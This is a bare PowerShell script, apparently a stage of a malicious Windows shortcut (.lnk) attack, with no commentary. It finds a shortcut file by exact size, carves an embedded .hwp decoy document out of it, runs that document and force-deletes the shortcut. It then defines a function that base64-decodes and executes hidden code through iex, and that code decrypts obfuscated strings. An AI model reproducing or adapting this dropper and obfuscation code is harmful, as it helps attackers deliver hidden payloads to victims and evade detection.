$lk=ls -Path '.\' ;
$lk= Where {$lk.length -eq 56397};
if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 56397}};$n=$lk.name.Replace('.lnk','.hwp');$lk=$lk.FullName;$file = [System.IO.File]::ReadAllBytes($lk);$file1=[byte[]]$file[5709..(5709+50688-1)];$fPath=$lk.Replace('.lnk','.hwp');[System.IO.File]::WriteAllBytes($fPath,$file1);&$fPath;ri $lk -force;

Function DS
{
	[CmdletBinding()] Param (
		[Parameter(Position = 0, ValueFromPipeline = $True)]
		[ValidateNotNullOrEmpty()]
		[String]
		$obfString,
		
		[Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $k		
    )
	
	$a="JHNlZ3NkID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkSykNCiR3ZXJmZyA9IChOZXctT2JqZWN0ICBNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsICcgJywgKCRPYmZTdHJpbmcgfENvbnZlcnRUby1TZWN1cmVTdHJpbmcgLUtleSAgJHNlZ3NkKSkuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZA0KICR3ZXJmZw0K"
	$dB = [System.Convert]::FromBase64String($a)
	$dS = [System.Text.Encoding]::UTF8.GetString($dB)
	iex $dS;
}





